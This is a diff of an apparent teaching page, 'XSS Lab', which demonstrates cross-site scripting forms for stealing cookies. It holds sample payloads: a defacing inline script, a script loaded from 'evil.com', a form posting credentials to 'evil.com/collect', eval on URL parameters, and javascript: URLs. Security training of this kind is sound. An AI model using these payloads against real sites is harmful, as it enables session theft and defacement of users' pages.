@@ -1,10 +1,29 @@
 <html>
-  <head></head>
+  <head>
+    <style>
+      span:after,
+      span:before {
+          content: '\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0\00a0';
+          text-decoration: line-through;
+      }
+      * {
+          box-sizing: border-box;
+      }
+      body {
+          background-color: lightgreen;
+      }
+  </style>
+  <title>XSS Lab</title>
+
+  </head>
   <body>
+
+    <h1>XSS Lab </h1>
+    <p>This page shows different forms of XSS to steal cookies</p>
     <br /><br />
     Paste this into your browser's address bar to execute the XSS attack:
     <br /><br />
-    <textarea rows="25%" cols="100%">
+    <br><br><textarea rows="25%" cols="100%">
 
       <hr>
 XSS attack 1: 
@@ -33,33 +52,62 @@ document.getElementsByTagName("*")[2].outerHTML
     <hr />
     <br /><br />
 
-    inline<br />
-    <textarea rows="3" cols="100">
+    <hr />
+    <span> inline </span>
+    <br /><br />
+    <a href="https://localhost:9381/xss/xss-inline.html" target=”_blank”>XSS inline</a>
+    <br /><br />
+
+
+
+    <br><br><textarea rows="3" cols="100">
     <script>document.body.innerHTML='defaced'</script>
     </textarea>
 
+
+    <hr />
+    <span> inline event handler</span>
     <br /><br />
-    inline event handlers<br />
-    <textarea rows="3" cols="100">
+    <a href="/xss/xss-event-handler.html" target=”_blank”>Inline event handler</a>
+
+
+
+    <br><br><textarea rows="3" cols="100">
       <button id="btn" onclick="doSomething()"></button>
     </textarea>
 
-    <br /><br />
-    Local Script Loading<br />
-    <textarea rows="3" cols="100">
+
+    
+
+    <hr />
+    <span> internal script loading</span>
+    <br />
+    <a href="xss/xss-internal-load.html" target=”_blank”>Internal script load</a>
+
+
+    <br><br><textarea rows="3" cols="100">
     <script src="https://localhost:3389/inline.js"></script>
-  </textarea
+    </textarea>
 
 
-    <br /><br />
-    Remote Script Loading<br />
-    <textarea rows="3" cols="100">
+
+  <hr />
+  <span> remote script loading</span>
+  <br />
+  <a href="xss/xss-remote-foreign-load.html" target=”_blank”>Remote Script Load</a>
+
+    <br><br><textarea rows="3" cols="100">
     <script src="https://evil.com/hacked.js"></script>
   </textarea
     >
-    <br /><br />
-    Text to Script with Eval // A Simple Calculator var op1 =<br />
-    <textarea rows="10" cols="100">
+
+
+
+    <hr />
+    <span> text to script with eval</span>
+    <br />
+    <a href="/xss/xss-eval-load.html" target=”_blank”>Script with Eval</a>
+    <br><br><textarea rows="10" cols="100">
     getUrlParameter("op1"); 
     var op2 = getUrlParameter("op2"); 
     var sum =
@@ -67,9 +115,15 @@ document.getElementsByTagName("*")[2].outerHTML
     console.log(`The sum is: ${sum}`); Inject XSS into
   </textarea
     >
-    <br /><br />
-    Forms<br />
 
+
+
+
+
+    <br /><br />
+    <hr />
+    <span> xss in forms </span><br />
+    <a href="https://localhost:9381/xss/TBD.js" target=”_blank”>Script with Forms</a>
     <form method="POST" action="https://evil.com/collect">
       <label>Username</label>
       <input
@@ -80,9 +134,17 @@ document.getElementsByTagName("*")[2].outerHTML
       "
       />
 
+
+
+
+
+
       <br /><br />
-      Malicious Java in pdf, flash, execute <br />
-      <textarea rows="10" cols="100">
+      <hr />
+      <span> java in pdf </span><br />
+      <a href="https://localhost:9381/xss/TBD.js" target=”_blank”> Script in PDF</a>
+
+      <br><br><textarea rows="10" cols="100">
       <object
         type="application/pdf"
         data="/media/examples/In-CC0.pdf"
@@ -93,8 +155,12 @@ document.getElementsByTagName("*")[2].outerHTML
       >
 
       <br /><br />
-      Javascript in URL <br />
-      <textarea rows="5" cols="60">
+      <hr />
+      <span> Java in URL </span><br />
+
+      <a href="https://localhost:9381/xss/TBD.js" target=”_blank”> Script in URL</a>
+      <br /><br />
+      <br><br><textarea rows="5" cols="60">
         <a href="javascript: ...JS CODE...">js</a>
     </textarea
       >
